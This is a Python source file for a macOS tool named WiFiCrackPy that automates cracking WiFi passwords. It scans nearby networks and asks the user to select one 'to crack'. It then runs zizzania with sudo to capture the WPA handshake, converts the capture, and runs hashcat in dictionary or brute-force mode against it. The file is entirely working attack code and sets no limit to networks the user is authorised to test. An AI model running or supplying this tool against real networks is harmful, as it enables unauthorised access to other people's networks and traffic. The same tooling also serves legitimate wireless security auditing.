import subprocess, re, argparse, objc
from os.path import expanduser, join
from prettytable import PrettyTable
import operator
from prettytable import PrettyTable
from pyfiglet import Figlet
from time import sleep

f = Figlet(font='big')
print('\n' + f.renderText('WiFiCrackPy'))

# Define paths
hashcat_path = join(expanduser('~'), 'hashcat', 'hashcat')
zizzania_path = join(expanduser('~'), 'zizzania', 'src', 'zizzania')

# Load CoreWLAN framework and CWWiFiClient class
objc.loadBundle('CoreWLAN', bundle_path='/System/Library/Frameworks/CoreWLAN.framework', module_globals=globals())
CWWiFiClient = objc.lookUpClass('CWWiFiClient')

# Load CoreLocation framework and CLLocationManager class
objc.loadBundle('CoreLocation', bundle_path='/System/Library/Frameworks/CoreLocation.framework', module_globals=globals())
CLLocationManager = objc.lookUpClass('CLLocationManager')

# Parse arguments
parser = argparse.ArgumentParser()
parser.add_argument('-w')
parser.add_argument('-m')
parser.add_argument('-i')
parser.add_argument('-p')
parser.add_argument('-d', action='store_false')
parser.add_argument('-o', action='store_true')
args = parser.parse_args()

# Initialise CoreLocation
print('Obtaining authorisation for location services (required for WiFi scanning)...\n')
location_manager = CLLocationManager.alloc().init()
location_manager.startUpdatingLocation()

# Wait for location services to be authorised
max_wait = 60
for i in range(1, max_wait):
    authorization_status = location_manager.authorizationStatus()
    if authorization_status == 3 or authorization_status == 4:
        print('Received authorisation, continuing...\n')
        break
    if i == max_wait-1:
        exit('Unable to obtain authorisation, exiting...\n')
    sleep(1)

# Get the default WiFi interface
cwlan_client = CWWiFiClient.sharedWiFiClient()
cwlan_interface = cwlan_client.interface()

def scan_networks():
    print('Scanning for networks...\n')

    # Scan for networks
    scan_results, _ = cwlan_interface.scanForNetworksWithName_error_(None, None)

    # Parse scan results and display in a table
    table = PrettyTable(['Number', 'Name', 'BSSID', 'RSSI', 'Channel', 'Security'])
    networks = {}

    if scan_results is not None:
        for i, result in enumerate(scan_results):
            # Store relevant network information
            networks[i] = {
                'bssid': result.bssid(),
                'channel': result.wlanChannel()
            }
            
            # Extract security type from the CWNetwork description
            security_type = re.search(r'security=(.*?)(,|$)', str(result)).group(1)

            # Add network to table
            table.add_row([i + 1, result.ssid(), result.bssid(), result.rssiValue(), result.channel(), security_type])
    else:
        print("No networks found or an error occurred.")
        quit()

    # Sort table by RSSI and then by Name
    sortedTable = table.get_string(sort_key=operator.itemgetter(2, 4), sortby="Name") 
    print(sortedTable)

    # Ask user to select a network to crack
    x = int(input('\nSelect a network to crack: ')) - 1
    capture_network(networks[x]['bssid'], networks[x]['channel'])


def capture_network(bssid, channel):
    # Dissociate from the current network
    cwlan_interface.disassociate()

    # Set the channel
    cwlan_interface.setWLANChannel_error_(channel, None)

    # Determine the network interface
    if args.i is None:
        iface = cwlan_interface.interfaceName()
    else:
        iface = args.i

    print('\nInitiating zizzania to capture handshake...\n')

    # Use zizzania to capture the handshake
    subprocess.run(['sudo', zizzania_path, '-i', iface, '-b', bssid, '-w', 'capture.pcap', '-q'] + ['-n'] * args.d)

    # Convert the capture to hashcat format
    subprocess.run(['hcxpcapngtool', '-o', 'capture.hc22000', 'capture.pcap'], stdout=subprocess.PIPE)

    print('\nHandshake ready for cracking...\n')

    crack_capture()


def crack_capture():
    # Ask user to select a cracking method from menu
    if args.m is None:
        options = PrettyTable(['Number', 'Mode'])
        for i, mode in enumerate(['Dictionary', 'Brute-force', 'Manual']):
            options.add_row([i + 1, mode])
        print(options)
        method = int(input('\nSelect an attack mode: '))
    else:
        method = int(args.m)

    # Get the wordlist
    if method == 1 and args.w is None:
        wordlist = input('\nInput a wordlist path: ')
    elif method == 1 and args.w is not None:
        wordlist = args.w

    # Run hashcat against the capture
    if method == 1:
        subprocess.run([hashcat_path, '-m', '22000', 'capture.hc22000', wordlist] + ['-O'] * args.o)
    elif method == 2:
        # Get the brute-force pattern
        if args.p is None:
            pattern = input('\nInput a brute-force pattern: ')
        else:
            pattern = args.p
        subprocess.run([hashcat_path, '-m', '22000', '-a', '3', 'capture.hc22000', pattern] + ['-O'] * args.o)
    else:
        print('\nRun hashcat against: capture.hc22000')


scan_networks()
